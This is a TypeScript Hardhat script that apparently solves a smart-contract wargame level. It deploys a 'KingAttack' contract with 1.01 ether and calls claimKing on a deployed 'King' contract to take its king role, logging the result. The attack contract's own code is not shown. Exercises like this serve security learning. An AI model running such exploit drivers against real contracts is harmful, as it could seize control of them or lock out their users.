import { ethers } from "hardhat";
import { KingAttack__factory } from "../typechain/factories/KingAttack__factory";
import { King__factory } from "../typechain/factories/King__factory";
import { King } from "../typechain/King";
import { KingAttack } from "../typechain/KingAttack";

async function main() {
  const [addr1] = await ethers.getSigners();
  const deployedAddress = '0x2336ACC780528E04A8f789406fA6DB00777e8E6f';
  const kingInstance: King = King__factory.connect(deployedAddress, addr1);

  const attackInstance: KingAttack = await new KingAttack__factory(addr1).deploy({ value: ethers.utils.parseEther("1.01") });
  await attackInstance.deployed();
  console.log("deployed : " + attackInstance.address)

  console.log(await kingInstance.owner())
  console.log(await kingInstance._king())

  await attackInstance.claimKing(kingInstance.address, { gasLimit: 200000 });
  console.log(await kingInstance.owner())
  console.log(await kingInstance._king())

  // await addr1.sendTransaction({
  //   from: addr1.address,
  //   to: kingInstance.address,
  //   value: ethers.utils.parseEther("1.01"),
  //   gasLimit: 200000
  // });
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
